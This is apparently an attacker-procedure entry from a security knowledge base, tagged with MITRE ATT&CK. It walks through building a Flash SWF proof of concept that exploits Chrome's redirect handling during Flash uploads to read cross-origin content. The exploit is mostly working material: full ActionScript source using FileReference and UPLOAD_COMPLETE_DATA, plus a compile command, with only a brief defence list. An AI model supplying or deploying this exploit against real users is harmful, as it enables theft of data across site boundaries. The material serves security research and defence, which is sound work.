---
id: p1b2c3d4-e5f6-7890-abcd-ef1234567891
tags:
  - flash
  - actionscript
  - swf-creation
type: procedure
tools:
  - '[[tools/ActionScript-Compiler]]'
tactics:
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
  - Browser (Google Chrome)
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T05:32:09.983Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Create SWF PoC File Using ActionScript

## Summary

This procedure creates a Proof-of-Concept (PoC) SWF file using ActionScript that leverages the FileReference class to initiate file uploads to a URL parameter, enabling the cross-domain bypass setup in Chrome.

## Description

In this attack scenario, the attacker develops a Flash SWF file that parses a URL parameter for the upload target (a redirect endpoint) and uses FileReference to start the upload process. This file is crucial for exploiting how Chrome handles 307/308 redirects during Flash uploads without enforcing cross-domain policies. The target environment is Google Chrome with Flash enabled, and the outcome is a malicious SWF that can disclose cross-origin content via the UPLOAD_COMPLETE_DATA event.

## Requirements

1. ActionScript development environment with compiler access
2. Knowledge of Flash APIs, specifically FileReference class
3. Attacker-controlled server for hosting the compiled SWF

## Defense

Defensive measures and detection strategies:

- Disable Flash Player in browsers or use modern alternatives like HTML5
- Enforce strict Content Security Policy (CSP) to block Flash execution
- Monitor for unusual SWF loads or file upload attempts in browser logs

## Objectives

1. Compile a functional SWF PoC for upload redirection
2. Set up event listeners for response capture
3. Prepare for cross-domain content disclosure

## Instructions

### Step 1: Write ActionScript Code

**Context**: Create the .as file with FileReference logic to handle uploads and events.

No specific command; use a text editor to write:

```actionscript
import flash.net.FileReference;
import flash.net.FileReferenceList;
import flash.events.Event;

var url:String = LoaderInfo(this.root.loaderInfo).parameters.url;
var fileRef:FileReference = new FileReference();
fileRef.addEventListener(Event.SELECT, onSelect);
fileRef.addEventListener(flash.net.FileReferenceEvent.UPLOAD_COMPLETE_DATA, onUploadComplete);
fileRef.browse();

function onSelect(event:Event):void {
    fileRef.upload(url);
}

function onUploadComplete(event:flash.net.FileReferenceEvent):void {
    trace(event.data); // Discloses target content
}
```

> This code prompts file selection, uploads to the provided URL, and traces the response data from UPLOAD_COMPLETE_DATA.

### Step 2: Compile to SWF

**Context**: Use the ActionScript Compiler to generate the SWF file.

No bash command; invoke the compiler (e.g., asc command if available):

```bash
asc chromeFileUploadCrossDomain.as -o chromeFileUploadCrossDomain.swf
```

> Compilation succeeds if no syntax errors; outputs the SWF binary ready for hosting.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/ActionScript-Compiler]]

## Tags

- [[flash]]
- [[actionscript]]
- [[swf-creation]]
